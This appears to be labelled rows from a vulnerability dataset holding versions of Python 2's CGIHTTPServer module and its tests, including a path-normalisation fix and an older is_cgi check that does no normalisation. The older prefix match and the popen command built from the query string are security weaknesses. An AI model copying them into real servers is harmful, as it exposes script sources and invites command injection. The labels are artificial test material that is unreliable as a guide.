                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, ""No such CGI script (%r)"" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, ""CGI script is not a plain file (%r)"" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, ""CGI script is not a Python script (%r)"" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, ""CGI script is not executable (%r)"" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader(""authorization"")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == ""basic"":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in ""\t\n\r "":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, """")
        os.environ.update(env)

        self.send_response(200, ""Script output follows"")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error(""CGI script exit status %#x"", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith(""w.exe""):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = ""%s -u %s"" % (interp, cmdline)
            if '=' not in query and '""' not in query:
                cmdline = '%s ""%s""' % (cmdline, query)
            self.log_message(""command: %s"", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == ""post"" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error(""CGI script exit status %#x"", sts)
            else:
                self.log_message(""CGI script exited OK"")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {""__name__"": ""__main__""})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error(""CGI script exit status %s"", str(sts))
            else:
                self.log_message(""CGI script exited OK"")


nobody = None

def nobody_uid():
    """"""Internal routine to get nobody's uid""""""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """"""Test for executable file.""""""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()
/n/n/n",1
22,bd7965d0b858c45c6e70831fa61729e0102020d6,"Lib/CGIHTTPServer.py/n/n""""""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
""""""


__version__ = ""0.4""

__all__ = [""CGIHTTPRequestHandler""]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """"""Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """"""

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """"""Serve a POST request.

        This is only implemented for CGI scripts.

        """"""

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, ""Can only POST to CGI scripts"")

    def send_head(self):
        """"""Version of send_head that support CGI scripts""""""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """"""Test whether self.path corresponds to a CGI script.

        Returns True and updates the cgi_info attribute to the tuple
        (dir, rest) if self.path requires running a CGI script.
        Returns False otherwise.

        The default implementation tests whether the normalized url
        path begins with one of the strings in self.cgi_directories
        (and the next character is a '/' or the end of the string).
        """"""
        splitpath = _url_collapse_path_split(self.path)
        if splitpath[0] in self.cgi_directories:
            self.cgi_info = splitpath
            return True
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """"""Test whether argument path is an executable file.""""""
        return executable(path)

    def is_python(self, path):
        """"""Test whether argument path is a Python script.""""""
        head, tail = os.path.splitext(path)
        return tail.lower() in ("".py"", "".pyw"")

    def run_cgi(self):
        """"""Execute a CGI script.""""""
        path = self.path
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, ""No such CGI script (%r)"" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, ""CGI script is not a plain file (%r)"" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, ""CGI script is not a Python script (%r)"" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, ""CGI script is not executable (%r)"" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader(""authorization"")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == ""basic"":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in ""\t\n\r "":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, """")
        os.environ.update(env)

        self.send_response(200, ""Script output follows"")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error(""CGI script exit status %#x"", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith(""w.exe""):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = ""%s -u %s"" % (interp, cmdline)
            if '=' not in query and '""' not in query:
                cmdline = '%s ""%s""' % (cmdline, query)
            self.log_message(""command: %s"", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == ""post"" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error(""CGI script exit status %#x"", sts)
            else:
                self.log_message(""CGI script exited OK"")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {""__name__"": ""__main__""})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error(""CGI script exit status %s"", str(sts))
            else:
                self.log_message(""CGI script exited OK"")


# TODO(gregory.p.smith): Move this into an appropriate library.
def _url_collapse_path_split(path):
    """"""
    Given a URL path, remove extra '/'s and '.' path elements and collapse
    any '..' references.

    Implements something akin to RFC-2396 5.2 step 6 to parse relative paths.

    Returns: A tuple of (head, tail) where tail is everything after the final /
    and head is everything before it.  Head will always start with a '/' and,
    if it contains anything else, never have a trailing '/'.

    Raises: IndexError if too many '..' occur within the path.
    """"""
    # Similar to os.path.split(os.path.normpath(path)) but specific to URL
    # path semantics rather than local operating system semantics.
    path_parts = []
    for part in path.split('/'):
        if part == '.':
            path_parts.append('')
        else:
            path_parts.append(part)
    # Filter out blank non trailing parts before consuming the '..'.
    path_parts = [part for part in path_parts[:-1] if part] + path_parts[-1:]
    if path_parts:
        tail_part = path_parts.pop()
    else:
        tail_part = ''
    head_parts = []
    for part in path_parts:
        if part == '..':
            head_parts.pop()
        else:
            head_parts.append(part)
    if tail_part and tail_part == '..':
        head_parts.pop()
        tail_part = ''
    return ('/' + '/'.join(head_parts), tail_part)


nobody = None

def nobody_uid():
    """"""Internal routine to get nobody's uid""""""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """"""Test for executable file.""""""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()
/n/n/nLib/test/test_httpservers.py/n/n""""""Unittests for the various HTTPServer modules.

Written by Cody A.W. Somerville <cody-somerville@ubuntu.com>,
Josip Dzolonga, and Michael Otteneder for the 2007/08 GHOP contest.
""""""

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from SimpleHTTPServer import SimpleHTTPRequestHandler
from CGIHTTPServer import CGIHTTPRequestHandler
import CGIHTTPServer

import os
import sys
import base64
import shutil
import urllib
import httplib
import tempfile
import threading

import unittest
from test import test_support


class NoLogRequestHandler:
    def log_message(self, *args):
        # don't write log messages to stderr
        pass


class TestServerThread(threading.Thread):
    def __init__(self, test_object, request_handler):
        threading.Thread.__init__(self)
        self.request_handler = request_handler
        self.test_object = test_object
        self.test_object.lock.acquire()

    def run(self):
        self.server = HTTPServer(('', 0), self.request_handler)
        self.test_object.PORT = self.server.socket.getsockname()[1]
        self.test_object.lock.release()
        try:
            self.server.serve_forever()
        finally:
            self.server.server_close()

    def stop(self):
        self.server.shutdown()


class BaseTestCase(unittest.TestCase):
    def setUp(self):
        self.lock = threading.Lock()
        self.thread = TestServerThread(self, self.request_handler)
        self.thread.start()
        self.lock.acquire()

    def tearDown(self):
        self.lock.release()
        self.thread.stop()

    def request(self, uri, method='GET', body=None, headers={}):
        self.connection = httplib.HTTPConnection('localhost', self.PORT)
        self.connection.request(method, uri, body, headers)
        return self.connection.getresponse()


class BaseHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, BaseHTTPRequestHandler):
        protocol_version = 'HTTP/1.1'
        default_request_version = 'HTTP/1.1'

        def do_TEST(self):
            self.send_response(204)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'close')
            self.end_headers()

        def do_KEEP(self):
            self.send_response(204)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'keep-alive')
            self.end_headers()

        def do_KEYERROR(self):
            self.send_error(999)

        def do_CUSTOM(self):
            self.send_response(999)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'close')
            self.end_headers()

    def setUp(self):
        BaseTestCase.setUp(self)
        self.con = httplib.HTTPConnection('localhost', self.PORT)
        self.con.connect()

    def test_command(self):
        self.con.request('GET', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_request_line_trimming(self):
        self.con._http_vsn_str = 'HTTP/1.1\n'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_version_bogus(self):
        self.con._http_vsn_str = 'FUBAR'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_digits(self):
        self.con._http_vsn_str = 'HTTP/9.9.9'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_none_get(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_version_none(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('PUT', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_invalid(self):
        self.con._http_vsn = 99
        self.con._http_vsn_str = 'HTTP/9.9'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 505)

    def test_send_blank(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('', '')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_header_close(self):
        self.con.putrequest('GET', '/')
        self.con.putheader('Connection', 'close')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_head_keep_alive(self):
        self.con._http_vsn_str = 'HTTP/1.1'
        self.con.putrequest('GET', '/')
        self.con.putheader('Connection', 'keep-alive')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_handler(self):
        self.con.request('TEST', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 204)

    def test_return_header_keep_alive(self):
        self.con.request('KEEP', '/')
        res = self.con.getresponse()
        self.assertEquals(res.getheader('Connection'), 'keep-alive')
        self.con.request('TEST', '/')

    def test_internal_key_error(self):
        self.con.request('KEYERROR', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 999)

    def test_return_custom_status(self):
        self.con.request('CUSTOM', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 999)


class SimpleHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, SimpleHTTPRequestHandler):
        pass

    def setUp(self):
        BaseTestCase.setUp(self)
        self.cwd = os.getcwd()
        basetempdir = tempfile.gettempdir()
        os.chdir(basetempdir)
        self.data = 'We are the knights who say Ni!'
        self.tempdir = tempfile.mkdtemp(dir=basetempdir)
        self.tempdir_name = os.path.basename(self.tempdir)
        temp = open(os.path.join(self.tempdir, 'test'), 'wb')
        temp.write(self.data)
        temp.close()

    def tearDown(self):
        try:
            os.chdir(self.cwd)
            try:
                shutil.rmtree(self.tempdir)
            except:
                pass
        finally:
            BaseTestCase.tearDown(self)

    def check_status_and_reason(self, response, status, data=None):
        body = response.read()
        self.assert_(response)
        self.assertEquals(response.status, status)
        self.assert_(response.reason != None)
        if data:
            self.assertEqual(data, body)

    def test_get(self):
        #constructs the path relative to the root directory of the HTTPServer
        response = self.request(self.tempdir_name + '/test')
        self.check_status_and_reason(response, 200, data=self.data)
        response = self.request(self.tempdir_name + '/')
        self.check_status_and_reason(response, 200)
        response = self.request(self.tempdir_name)
        self.check_status_and_reason(response, 301)
        response = self.request('/ThisDoesNotExist')
        self.check_status_and_reason(response, 404)
        response = self.request('/' + 'ThisDoesNotExist' + '/')
        self.check_status_and_reason(response, 404)
        f = open(os.path.join(self.tempdir_name, 'index.html'), 'w')
        response = self.request('/' + self.tempdir_name + '/')
        self.check_status_and_reason(response, 200)
        if os.name == 'posix':
            # chmod won't work as expected on Windows platforms
            os.chmod(self.tempdir, 0)
            response = self.request(self.tempdir_name + '/')
            self.check_status_and_reason(response, 404)
            os.chmod(self.tempdir, 0755)

    def test_head(self):
        response = self.request(
            self.tempdir_name + '/test', method='HEAD')
        self.check_status_and_reason(response, 200)
        self.assertEqual(response.getheader('content-length'),
                         str(len(self.data)))
        self.assertEqual(response.getheader('content-type'),
                         'application/octet-stream')

    def test_invalid_requests(self):
        response = self.request('/', method='FOO')
        self.check_status_and_reason(response, 501)
        # requests must be case sensitive,so this should fail too
        response = self.request('/', method='get')
        self.check_status_and_reason(response, 501)
        response = self.request('/', method='GETs')
        self.check_status_and_reason(response, 501)


cgi_file1 = """"""\
#!%s

print ""Content-type: text/html""
print
print ""Hello World""
""""""

cgi_file2 = """"""\
#!%s
import cgi

print ""Content-type: text/html""
print

form = cgi.FieldStorage()
print ""%%s, %%s, %%s"" %% (form.getfirst(""spam""), form.getfirst(""eggs""),\
              form.getfirst(""bacon""))
""""""

class CGIHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, CGIHTTPRequestHandler):
        pass

    def setUp(self):
        BaseTestCase.setUp(self)
        self.parent_dir = tempfile.mkdtemp()
        self.cgi_dir = os.path.join(self.parent_dir, 'cgi-bin')
        os.mkdir(self.cgi_dir)

        self.file1_path = os.path.join(self.cgi_dir, 'file1.py')
        with open(self.file1_path, 'w') as file1:
            file1.write(cgi_file1 % sys.executable)
        os.chmod(self.file1_path, 0777)

        self.file2_path = os.path.join(self.cgi_dir, 'file2.py')
        with open(self.file2_path, 'w') as file2:
            file2.write(cgi_file2 % sys.executable)
        os.chmod(self.file2_path, 0777)

        self.cwd = os.getcwd()
        os.chdir(self.parent_dir)

    def tearDown(self):
        try:
            os.chdir(self.cwd)
            os.remove(self.file1_path)
            os.remove(self.file2_path)
            os.rmdir(self.cgi_dir)
            os.rmdir(self.parent_dir)
        finally:
            BaseTestCase.tearDown(self)

    def test_url_collapse_path_split(self):
        test_vectors = {
            '': ('/', ''),
            '..': IndexError,
            '/.//..': IndexError,
            '/': ('/', ''),
            '//': ('/', ''),
            '/\\': ('/', '\\'),
            '/.//': ('/', ''),
            'cgi-bin/file1.py': ('/cgi-bin', 'file1.py'),
            '/cgi-bin/file1.py': ('/cgi-bin', 'file1.py'),
            'a': ('/', 'a'),
            '/a': ('/', 'a'),
            '//a': ('/', 'a'),
            './a': ('/', 'a'),
            './C:/': ('/C:', ''),
            '/a/b': ('/a', 'b'),
            '/a/b/': ('/a/b', ''),
            '/a/b/c/..': ('/a/b', ''),
            '/a/b/c/../d': ('/a/b', 'd'),
            '/a/b/c/../d/e/../f': ('/a/b/d', 'f'),
            '/a/b/c/../d/e/../../f': ('/a/b', 'f'),
            '/a/b/c/../d/e/.././././..//f': ('/a/b', 'f'),
            '../a/b/c/../d/e/.././././..//f': IndexError,
            '/a/b/c/../d/e/../../../f': ('/a', 'f'),
            '/a/b/c/../d/e/../../../../f': ('/', 'f'),
            '/a/b/c/../d/e/../../../../../f': IndexError,
            '/a/b/c/../d/e/../../../../f/..': ('/', ''),
        }
        for path, expected in test_vectors.iteritems():
            if isinstance(expected, type) and issubclass(expected, Exception):
                self.assertRaises(expected,
                                  CGIHTTPServer._url_collapse_path_split, path)
            else:
                actual = CGIHTTPServer._url_collapse_path_split(path)
                self.assertEquals(expected, actual,
                                  msg='path = %r\nGot:    %r\nWanted: %r' % (
                                  path, actual, expected))

    def test_headers_and_content(self):
        res = self.request('/cgi-bin/file1.py')
        self.assertEquals(('Hello World\n', 'text/html', 200), \
             (res.read(), res.getheader('Content-type'), res.status))

    def test_post(self):
        params = urllib.urlencode({'spam' : 1, 'eggs' : 'python', 'bacon' : 123456})
        headers = {'Content-type' : 'application/x-www-form-urlencoded'}
        res = self.request('/cgi-bin/file2.py', 'POST', params, headers)

        self.assertEquals(res.read(), '1, python, 123456\n')

    def test_invaliduri(self):
        res = self.request('/cgi-bin/invalid')
        res.read()
        self.assertEquals(res.status, 404)

    def test_authorization(self):
        headers = {'Authorization' : 'Basic %s' % \
                base64.b64encode('username:pass')}
        res = self.request('/cgi-bin/file1.py', 'GET', headers=headers)
        self.assertEquals(('Hello World\n', 'text/html', 200), \
             (res.read(), res.getheader('Content-type'), res.status))

    def test_no_leading_slash(self):
        # http://bugs.python.org/issue2254
        res = self.request('cgi-bin/file1.py')
        self.assertEquals(('Hello World\n', 'text/html', 200),
             (res.read(), res.getheader('Content-type'), res.status))


def test_main(verbose=None):
    try:
        cwd = os.getcwd()
        test_support.run_unittest(BaseHTTPServerTestCase,
                                  SimpleHTTPServerTestCase,
                                  CGIHTTPServerTestCase
                                  )
    finally:
        os.chdir(cwd)

if __name__ == '__main__':
    test_main()
/n/n/n",0
23,bd7965d0b858c45c6e70831fa61729e0102020d6,"/Lib/CGIHTTPServer.py/n/n""""""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
""""""


__version__ = ""0.4""

__all__ = [""CGIHTTPRequestHandler""]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """"""Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """"""

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """"""Serve a POST request.

        This is only implemented for CGI scripts.

        """"""

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, ""Can only POST to CGI scripts"")

    def send_head(self):
        """"""Version of send_head that support CGI scripts""""""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """"""Test whether self.path corresponds to a CGI script,
        and return a boolean.

        This function sets self.cgi_info to a tuple (dir, rest)
        when it returns True, where dir is the directory part before
        the CGI script name.  Note that rest begins with a
        slash if it is not empty.

        The default implementation tests whether the path
        begins with one of the strings in the list
        self.cgi_directories (and the next character is a '/'
        or the end of the string).
        """"""

        path = self.path

        for x in self.cgi_directories:
            i = len(x)
            if path[:i] == x and (not path[i:] or path[i] == '/'):
                self.cgi_info = path[:i], path[i+1:]
                return True
        return False

